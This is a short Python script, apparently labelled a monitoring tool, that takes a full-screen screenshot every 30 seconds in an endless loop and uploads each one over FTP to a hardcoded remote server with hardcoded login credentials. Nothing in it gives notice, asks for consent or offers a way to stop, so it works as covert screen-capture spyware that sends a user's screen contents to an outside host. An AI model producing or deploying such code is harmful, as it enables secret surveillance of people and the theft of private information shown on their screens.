from PIL import ImageGrab
import time
from ftplib import FTP
import datetime

host='123.207.167.***'
username='jiankong***'
password='******'
#D:\anaconda\Lib\site-packages\PyQt5\Qt\bin
def ftpconnect(host, username, password):
    ftp = FTP()
    # ftp.set_debuglevel(2)
    ftp.connect(host, 21)
    ftp.login(username, password)
    return ftp

#从ftp下载文件
def downloadfile(ftp, remotepath, localpath):
    bufsize = 1024
    fp = open(localpath, 'wb')
    ftp.retrbinary('RETR ' + remotepath, fp.write, bufsize)
    ftp.set_debuglevel(0)
    fp.close()
#从本地上传文件到ftp
def uploadfile(ftp, remotepath, localpath):
    bufsize = 1024
    fp = open(localpath, 'rb')
    ftp.storbinary('STOR ' + remotepath, fp, bufsize)
    ftp.set_debuglevel(0)
    fp.close()

def Send_FTP_image(host,username,password,remotepath,localpath):
    ftp = ftpconnect(host,username,password)
    uploadfile(ftp,remotepath,localpath)
    ftp.quit()
def Cut_Save_Screen():
    img=ImageGrab.grab()
    img.save('screen.jpg')
def monitor():
    Cut_Save_Screen()
    Send_FTP_image(host, username, password, datetime.datetime.now().strftime('%Y_%m_%d_%H_%M_%S') + ".jpg","screen.jpg")
while True:
    time.sleep(30)
    monitor()
